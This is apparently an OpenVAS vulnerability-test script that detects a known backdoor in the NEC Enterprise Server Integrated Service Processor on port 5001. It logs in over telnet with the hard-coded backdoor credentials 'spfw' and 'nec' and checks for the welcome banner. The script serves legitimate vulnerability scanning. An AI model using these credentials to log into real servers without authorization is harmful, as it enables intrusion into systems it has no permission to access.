###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_nec_enterprise_server_53493.nasl 11141 2018-08-28 10:01:13Z asteins $
#
# NEC Enterprise Server Backdoor Unauthorized Access Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103498");
  script_bugtraq_id(53493);
  script_version("$Revision: 11141 $");
  script_name("NEC Enterprise Server Backdoor Unauthorized Access Vulnerability");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-08-28 12:01:13 +0200 (Tue, 28 Aug 2018) $");
  script_tag(name:"creation_date", value:"2012-06-21 10:41:21 +0200 (Thu, 21 Jun 2012)");
  script_category(ACT_ATTACK);
  script_family("Default Accounts");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl");
  script_require_ports(5001);

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/53493");
  script_xref(name:"URL", value:"http://www.nec.com.sg/index.php?q=products/enterprise-servers");

  script_tag(name:"summary", value:"NEC Enterprise Server is prone to an unauthorized-access vulnerability
  due to a backdoor in all versions of the application.");
  script_tag(name:"impact", value:"Attackers can exploit this issue to gain unauthorized access to the
  affected application. This may aid in further attacks.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("telnet_func.inc");

port = 5001;
if( ! get_port_state( port ) ) exit( 0 );

soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );

r = telnet_negotiate( socket:soc );

if( "Integrated Service Processor" >!< r ) exit( 0 );

send( socket:soc, data:'spfw\n' );
recv = recv( socket:soc, length:512 );

if( "iSP password" >!< recv ) exit( 0 );

send( socket:soc, data:'nec\n' );
recv = recv( socket:soc, length:512 );

close( soc );

if( "Welcome to Integrated Service Processor" >< recv && "iSP FW version" >< recv ) {
  security_message( port:port );
  exit( 0 );
}

exit( 99 );
